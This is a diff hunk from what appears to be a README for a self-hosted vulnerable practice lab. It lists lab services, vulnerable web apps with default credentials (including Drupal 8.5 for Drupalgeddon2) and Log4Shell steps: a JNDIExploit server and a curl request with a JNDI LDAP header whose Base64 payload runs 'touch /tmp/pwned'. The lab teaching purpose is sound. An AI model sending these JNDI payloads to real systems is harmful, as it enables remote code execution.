@@ -36,9 +36,9 @@ then
 `java -jar JNDIExploit-1.2-SNAPSHOT.jar -i your-private-ip -p 8888`
 then. will execute 'touch /tmp/pwned'
 `curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://your-private-ip:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'` (you can play with payloads) https://github.com/christophetd/log4shell-vulnerable-app
-20) echo 7
-21) time 37
-22) discard 9
+20) echo - port 7
+21) time - port 37
+22) discard - port 9
 23) QDPM 9.1 https://localhost/qdpm/index.php user:admin@localhost password:toor (remember for web servers you need apache2 and mysql running read note below to bring them up first)
 24) RiteCMS http://localhost/ritecms/admin.php user:admin password:admin (this is SQLite) RFI
 25) Drupal 8.5 -- localhost/drupal85 root toor - DRUPALGEDDON2
